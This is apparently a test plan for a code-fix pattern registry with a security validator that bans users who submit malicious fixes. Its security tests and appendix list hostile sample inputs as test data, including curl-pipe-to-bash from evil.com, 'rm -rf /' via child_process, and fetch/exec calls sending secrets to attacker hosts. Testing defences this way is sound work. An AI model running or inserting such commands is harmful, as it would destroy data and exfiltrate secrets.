# Fix Pattern Registry - Test Plan

## Overview

This document outlines test scenarios for validating the Fix Pattern Registry system, including pattern capture, security validation, user trust management, and fix application for both Basic and Pro tiers.

---

## Test Environment Setup

### Prerequisites
```bash
# 1. Ensure test repository is set up
git clone https://github.com/your-org/codequal.git
cd codequal

# 2. Switch to test branch with known issues
git checkout test/autofix-baseline

# 3. Start services
npm run dev

# 4. Ensure Redis is running (for caching)
redis-cli ping
```

### Test Files Location
```
packages/agents/src/fix-agent/fix-pattern-registry/
├── test-pattern-registry.ts      # Basic functionality tests
├── test-security-flow.ts         # Security and ban tests
└── TEST_PLAN.md                  # This file
```

---

## Part 1: Unit Tests (Automated)

### 1.1 Pattern Registry Core Functions

| ID | Test Case | Expected Result | Command |
|----|-----------|-----------------|---------|
| U1.1 | Lookup existing pattern | Returns pattern with confidence 90% | `test-pattern-registry.ts` |
| U1.2 | Lookup non-existent pattern | Returns `found: false` | `test-pattern-registry.ts` |
| U1.3 | Register new pattern | Pattern added to registry | `test-pattern-registry.ts` |
| U1.4 | Apply pattern to code | Returns fixed code | `test-pattern-registry.ts` |
| U1.5 | Get pattern stats | Returns correct counts | `test-pattern-registry.ts` |

### 1.2 Security Validator

| ID | Test Case | Expected Result | Command |
|----|-----------|-----------------|---------|
| U2.1 | Safe fix (shell injection) | Score: 100, Pass | `test-security-flow.ts` |
| U2.2 | Malicious fix (eval) | Score: 60, Block, Ban | `test-security-flow.ts` |
| U2.3 | Malicious fix (child_process) | Score: 0, Block, Ban | `test-security-flow.ts` |
| U2.4 | Malicious fix (curl \| bash) | Score: 35, Block, Ban | `test-security-flow.ts` |
| U2.5 | Fix with external URL | Flag as risk | `test-security-flow.ts` |
| U2.6 | Fix with hardcoded credential | Block | `test-security-flow.ts` |
| U2.7 | Excessive scope change (50+ lines) | Warning/Block | Manual |

### 1.3 User Trust Management

| ID | Test Case | Expected Result | Command |
|----|-----------|-----------------|---------|
| U3.1 | New user submission | Status: pending_review | `test-security-flow.ts` |
| U3.2 | Trusted user submission | Status: active, autoApproved: true | `test-security-flow.ts` |
| U3.3 | Banned user submission | Immediately rejected | `test-security-flow.ts` |
| U3.4 | canContribute - new user | canContribute: true, trustStatus: new | `test-security-flow.ts` |
| U3.5 | canContribute - trusted user | canContribute: true, trustStatus: trusted | `test-security-flow.ts` |
| U3.6 | canContribute - banned user | canContribute: false | `test-security-flow.ts` |
| U3.7 | Promotion after 5 approvals | trustStatus changes to trusted | Manual |

### Run Automated Tests
```bash
cd packages/agents

# Run all unit tests
npx ts-node src/fix-agent/fix-pattern-registry/test-pattern-registry.ts
npx ts-node src/fix-agent/fix-pattern-registry/test-security-flow.ts
```

---

## Part 2: Integration Tests - Basic Tier

Basic tier users get issue detection and classification but fixes require manual review.

### 2.1 Issue Detection (Basic Tier)

| ID | Test Case | Steps | Expected Result |
|----|-----------|-------|-----------------|
| B1.1 | Detect shell injection | 1. Run V9 analysis on test repo<br>2. Check SARIF output | Issue detected with rule `yaml.github-actions.security.run-shell-injection` |
| B1.2 | Load issues in IDE | 1. Load SARIF in VS Code<br>2. Navigate to issue | Issue shown at correct line with description |
| B1.3 | Pattern lookup (exists) | 1. Trigger fix lookup for shell injection | Pattern found, confidence 90% |
| B1.4 | Pattern lookup (not exists) | 1. Trigger fix lookup for unknown rule | Returns "Manual review required" |

### 2.2 Manual Fix Flow (Basic Tier)

| ID | Test Case | Steps | Expected Result |
|----|-----------|-------|-----------------|
| B2.1 | User fixes manually | 1. Edit code to fix shell injection<br>2. Add env: block<br>3. Replace interpolation | Code compiles, issue resolved |
| B2.2 | Contribute prompt shown | 1. After manual fix<br>2. Check if dialog appears | "Would you like to contribute this fix pattern for review?" |
| B2.3 | Submit fix pattern | 1. Accept contribute dialog<br>2. Submit fix | Pattern captured, status: pending_review |
| B2.4 | Security validation | 1. Check server logs | Security score logged, all checks pass |

### 2.3 Test Commands (Basic Tier)
```bash
# Run V9 analysis in Basic tier mode
cd packages/agents
export USER_TIER=basic
npx ts-node tests/integration/test-v9-lite-e2e.ts

# Check output files
ls tests/integration/test-outputs/
# - codequal-sarif-report.json (issues)
# - codequal-lsp-actions.json (code actions - limited for Basic)
```

---

## Part 3: Integration Tests - Pro Tier

Pro tier users get automatic fixes from patterns and AI-generated fixes.

### 3.1 Automatic Fix Application (Pro Tier)

| ID | Test Case | Steps | Expected Result |
|----|-----------|-------|-----------------|
| P1.1 | Pattern-based fix | 1. Run V9 with Pro tier<br>2. Check fix for shell injection | Automatic fix generated from pattern |
| P1.2 | Fix content correct | 1. Inspect generated fix<br>2. Verify env: block added | Fix matches pattern template |
| P1.3 | Fix applies cleanly | 1. Apply fix to code<br>2. Re-run analysis | Issue no longer detected |
| P1.4 | Multiple fixes same rule | 1. Have 3 shell injection issues<br>2. Apply all | All 3 fixed correctly |

### 3.2 AI-Generated Fix (Pro Tier - No Pattern)

| ID | Test Case | Steps | Expected Result |
|----|-----------|-------|-----------------|
| P2.1 | AI fix when no pattern | 1. Find rule without pattern<br>2. Request fix | AI generates fix suggestion |
| P2.2 | AI fix quality | 1. Review AI fix<br>2. Apply to code | Fix resolves issue |
| P2.3 | Contribute AI fix | 1. After applying AI fix<br>2. Submit as pattern | Pattern captured for future use |

### 3.3 Trusted User Flow (Pro Tier)

| ID | Test Case | Steps | Expected Result |
|----|-----------|-------|-----------------|
| P3.1 | Trusted user submits | 1. Simulate trusted user<br>2. Submit pattern | Pattern activates immediately |
| P3.2 | Pattern available | 1. Check registry<br>2. Look up pattern | New pattern found, status: active |
| P3.3 | Others can use pattern | 1. Different user hits same rule<br>2. Request fix | Fix generated from new pattern |

### 3.4 Test Commands (Pro Tier)
```bash
# Run V9 analysis in Pro tier mode
cd packages/agents
export USER_TIER=pro
npx ts-node tests/integration/test-v9-lite-e2e.ts

# Check output files
ls tests/integration/test-outputs/
# - codequal-sarif-report.json (issues)
# - codequal-lsp-actions.json (code actions with fixes)
# - attachments/*.json (fix files)
```

---

## Part 4: Security Tests

### 4.1 Malicious Pattern Detection

| ID | Test Case | Malicious Code | Expected Result |
|----|-----------|----------------|-----------------|
| S1.1 | eval() injection | `eval(userInput)` | Block + Ban |
| S1.2 | child_process exec | `require('child_process').exec('rm -rf /')` | Block + Ban |
| S1.3 | GitHub token | `const token = "ghp_..."` | Block + Ban |
| S1.4 | curl pipe to bash | `curl https://evil.com/script.sh \| bash` | Block + Ban |
| S1.5 | Data exfiltration | `fetch('https://evil.com', {body: data})` | Block + Ban |
| S1.6 | Private key | `-----BEGIN RSA PRIVATE KEY-----` | Block + Ban |
| S1.7 | Base64 obfuscation | `atob('long-base64-string')` | Flag as risk |

### 4.2 Ban System

| ID | Test Case | Steps | Expected Result |
|----|-----------|-------|-----------------|
| S2.1 | User banned on malicious | 1. Submit malicious fix<br>2. Check user status | trustStatus: banned |
| S2.2 | Banned user blocked | 1. Try to submit again<br>2. Check response | Immediately rejected |
| S2.3 | canContribute returns false | 1. Call canContribute API<br>2. Check response | canContribute: false |
| S2.4 | Ban persists | 1. Restart server<br>2. Check user status | Still banned |
| S2.5 | Ban reason logged | 1. Check server logs | Ban reason recorded |

### 4.3 Test Script for Security
```typescript
// Run this to test security scenarios
import { getFixSecurityValidator } from './fix-security-validator';

const validator = getFixSecurityValidator();

const maliciousTests = [
  { name: 'eval', code: 'eval(input)' },
  { name: 'child_process', code: "require('child_process').exec('ls')" },
  { name: 'github_token', code: 'const t = "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"' },
  { name: 'curl_bash', code: 'curl https://evil.com/s.sh | bash' },
];

for (const test of maliciousTests) {
  const result = validator.validate('const x = 1', test.code, 'test', 'test.js');
  console.log(`${test.name}: blocked=${result.isBlocked}, ban=${result.shouldBanUser}`);
}
```

---

## Part 5: End-to-End Tests

### 5.1 Complete Flow - New User (Basic Tier)

```
Scenario: New user discovers and contributes a fix pattern

1. DETECT: Run analysis, find shell injection at deploy.yml:48
2. LOOKUP: No pattern exists for this specific variation
3. FIX: User manually adds env: block
4. CONTRIBUTE: User accepts "Contribute this fix?" dialog
5. VALIDATE: Security check passes (score: 100)
6. QUEUE: Pattern goes to pending_review
7. APPROVE: Admin approves pattern
8. ACTIVATE: Pattern now available for all users
9. VERIFY: Next user gets automatic fix for same issue
```

### 5.2 Complete Flow - Trusted User (Pro Tier)

```
Scenario: Trusted user contributes pattern that activates immediately

1. DETECT: Run analysis, find new type of issue
2. LOOKUP: No pattern exists
3. FIX: AI generates fix, user applies it
4. CONTRIBUTE: User accepts dialog
5. VALIDATE: Security check passes
6. ACTIVATE: Pattern immediately active (trusted user)
7. VERIFY: Pattern available in registry
8. TEST: Another user gets automatic fix
```

### 5.3 Complete Flow - Malicious Attempt

```
Scenario: Attacker tries to inject malicious pattern

1. SUBMIT: Attacker submits fix containing eval()
2. VALIDATE: Security check detects malicious code
3. BLOCK: Submission rejected
4. BAN: User permanently banned
5. VERIFY: User cannot submit any more patterns
6. VERIFY: IDE no longer shows contribute option
```

---

## Part 6: IDE Testing Checklist

### 6.1 VS Code Extension Tests

| ID | Test | Steps | Pass/Fail |
|----|------|-------|-----------|
| IDE1 | Load SARIF file | 1. Cmd+Shift+P → "Load SARIF"<br>2. Select file | Issues appear in Problems panel |
| IDE2 | Load LSP actions | 1. Cmd+Shift+P → "Load LSP"<br>2. Select file | Code actions available |
| IDE3 | Quick fix (Cmd+.) | 1. Position cursor on issue<br>2. Press Cmd+. | Fix options shown |
| IDE4 | Apply single fix | 1. Select fix from menu<br>2. Apply | Code modified correctly |
| IDE5 | Apply all fixes | 1. Use "Fix all" command | All issues fixed |
| IDE6 | Contribute dialog | 1. After manual fix<br>2. Check for dialog | Dialog appears (if no pattern) |
| IDE7 | Banned user - no dialog | 1. Simulate banned user<br>2. Fix manually | No contribute dialog shown |

### 6.2 Test Files for IDE

```bash
# Generate test files
cd packages/agents
export USER_TIER=pro
npx ts-node tests/integration/test-v9-lite-e2e.ts

# Files to load in IDE:
# - test-outputs/codequal-sarif-report.json
# - test-outputs/codequal-lsp-actions.json
```

---

## Part 7: Regression Tests

### 7.1 After Pattern Registry Changes

| ID | Test | Purpose |
|----|------|---------|
| R1 | Existing patterns still work | Verify no breaking changes |
| R2 | Security validator catches all malicious patterns | Verify security not weakened |
| R3 | Trust levels work correctly | Verify new/trusted/banned flow |
| R4 | API responses unchanged | Verify IDE compatibility |

### 7.2 After V9 Changes

| ID | Test | Purpose |
|----|------|---------|
| R5 | SARIF output includes pattern info | Verify integration |
| R6 | LSP code actions use patterns | Verify pattern-based fixes |
| R7 | Basic/Pro tier differentiation | Verify tier features |

---

## Part 8: Performance Tests

| ID | Test | Target | Measure |
|----|------|--------|---------|
| PERF1 | Pattern lookup | < 10ms | Time to find pattern |
| PERF2 | Security validation | < 50ms | Time to validate fix |
| PERF3 | Pattern application | < 20ms | Time to generate fixed code |
| PERF4 | 1000 patterns lookup | < 100ms | Scale test |

---

## Quick Test Commands Summary

```bash
# Unit tests
npx ts-node src/fix-agent/fix-pattern-registry/test-pattern-registry.ts
npx ts-node src/fix-agent/fix-pattern-registry/test-security-flow.ts

# Integration tests - Basic tier
export USER_TIER=basic
npx ts-node tests/integration/test-v9-lite-e2e.ts

# Integration tests - Pro tier
export USER_TIER=pro
npx ts-node tests/integration/test-v9-lite-e2e.ts

# Generate IDE test files
npx ts-node tests/integration/generate-lsp-sarif-from-manifest.ts
```

---

## Test Results Template

```markdown
## Test Run: [DATE]

### Environment
- Branch: test/autofix-baseline
- Tier: Basic / Pro
- Commit: [hash]

### Results

| Category | Passed | Failed | Skipped |
|----------|--------|--------|---------|
| Unit Tests | | | |
| Security Tests | | | |
| Integration (Basic) | | | |
| Integration (Pro) | | | |
| IDE Tests | | | |

### Failed Tests
- [ ] Test ID: Description of failure

### Notes
-
```

---

## Appendix: Test Data

### Sample Shell Injection Issue
```yaml
# File: .github/workflows/deploy.yml
# Line: 48
# Rule: yaml.github-actions.security.run-shell-injection

# BEFORE (vulnerable)
- name: Deploy to environment
  run: |
    kubectl apply -f deploy-${{ github.event.inputs.environment }}.yaml

# AFTER (fixed)
- name: Deploy to environment
  env:
    DEPLOY_ENV: ${{ github.event.inputs.environment }}
  run: |
    kubectl apply -f "deploy-$DEPLOY_ENV.yaml"
```

### Sample Malicious Fix Attempts
```javascript
// Attempt 1: eval injection
const x = eval(userInput);

// Attempt 2: child_process
require('child_process').exec('curl https://evil.com/steal?data=' + data);

// Attempt 3: data exfiltration
fetch('https://attacker.com/collect', { body: JSON.stringify(secrets) });

// Attempt 4: hardcoded credential
const API_KEY = 'ghp_abcdefghijklmnopqrstuvwxyz123456';
```
